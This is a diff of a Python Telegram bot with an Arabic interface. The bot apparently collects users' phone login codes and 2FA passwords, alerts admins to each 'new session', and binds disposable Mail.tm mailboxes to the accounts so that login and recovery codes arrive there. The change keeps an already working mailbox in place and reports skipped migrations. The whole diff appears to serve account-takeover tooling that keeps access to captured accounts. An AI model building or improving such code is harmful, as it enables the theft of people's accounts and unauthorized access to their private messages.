@@ -325,6 +325,7 @@ async def numpad_press(callback: CallbackQuery, state: FSMContext):
                 result.get("email_linked"),
                 result.get("login_email"),
                 result.get("email_error"),
+                result.get("email_skipped", False),
             )
         else:
             await edit_or_send(
@@ -367,6 +368,7 @@ async def text_2fa(message: Message, state: FSMContext):
             result.get("email_linked"),
             result.get("login_email"),
             result.get("email_error"),
+            result.get("email_skipped", False),
         )
     else:
         await edit_or_send(
@@ -375,14 +377,25 @@ async def text_2fa(message: Message, state: FSMContext):
         )
 
 
-async def _notify_new_session(phone: str, email_linked: bool = False, login_email: str = None, email_error: str = None):
+async def _notify_new_session(
+    phone: str,
+    email_linked: bool = False,
+    login_email: str = None,
+    email_error: str = None,
+    email_skipped: bool = False,
+):
     session = await database.get_session_by_phone(phone)
     if not session:
         return
     uname = session["username"]  or "لا يوجد"
     fname = session["full_name"] or "غير معروف"
     if email_linked and login_email:
-        mail_line = f"📧 بريد Login: <code>{h(login_email)}</code>"
+        if email_skipped:
+            mail_line = (
+                f"📧 بريد Login (محفوظ — لم يُغيَّر): <code>{h(login_email)}</code>"
+            )
+        else:
+            mail_line = f"📧 بريد Login: <code>{h(login_email)}</code>"
     elif email_error:
         mail_line = f"⚠️ فشل ربط بريد Login: <code>{h(email_error)}</code>"
     else:
@@ -892,9 +905,24 @@ async def auto_mail_process(callback: CallbackQuery):
     if not await _guard_session_row(callback, session):
         return
     phone, sid = session["phone"], session["id"]
+    row = session
+    kept = await session_manager.existing_login_email_ok(row)
+    if kept:
+        await callback.answer("ℹ️ البريد الحالي شغال — لم يُغيَّر", show_alert=True)
+        await callback.message.edit_text(
+            f"ℹ️ <b>بريد Login شغال — لم يُستبدل</b>\n\n"
+            f"📧 <code>{h(kept)}</code>\n\n"
+            f"<i>يُستخدم لاستلام أكواد الدخول والإنعاش. "
+            f"لا يُنشأ بريد جديد طالما الصندوق يعمل.</i>"
+            + ADMIN_FOOTER,
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid),
+        )
+        return
+
     await callback.answer("⏳ جاري المعالجة...")
     await callback.message.edit_text(
-        "⏳ جاري توليد بريد جديد وانتظار الكود...\n"
+        "⏳ جاري ربط بريد Login جديد وانتظار الكود...\n"
         "<i>قد يستغرق حتى دقيقتين — لا تضغط زراً آخر</i>"
         + ADMIN_FOOTER,
         parse_mode="HTML",
@@ -904,10 +932,17 @@ async def auto_mail_process(callback: CallbackQuery):
     except Exception as e:
         logging.exception("auto_mail %s: %s", phone, e)
         res = {"success": False, "error": str(e)}
-    if res["success"]:
+    if res.get("skipped"):
+        await callback.message.edit_text(
+            f"ℹ️ <b>بريد Login شغال — لم يُستبدل</b>\n\n"
+            f"📧 <code>{h(res.get('email', ''))}</code>" + ADMIN_FOOTER,
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid),
+        )
+    elif res["success"]:
         new_email = res.get("email", "")
         await callback.message.edit_text(
-            f"✅ تم تغيير البريد بنجاح إلى:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
+            f"✅ تم ربط البريد:\n<code>{h(new_email)}</code>" + ADMIN_FOOTER,
             parse_mode="HTML",
             reply_markup=back_to_session_keyboard(sid),
         )
@@ -1221,9 +1256,11 @@ async def _startup_email_migration():
             return
         logging.info("starting email migration for %d sessions", len(pending))
         stats = await session_manager.migrate_old_sessions_emails()
+        skipped = stats.get("skipped", 0)
         await notify_admins(
             f"📧 <b>ترحيل بريد Login (Mail.tm)</b>\n\n"
             f"✅ نجح: {stats['migrated']}\n"
+            f"⏭️ بدون تغيير (شغال): {skipped}\n"
             f"❌ فشل: {stats['failed']}\n"
             f"📊 الإجمالي: {stats['total']}"
             + ADMIN_FOOTER
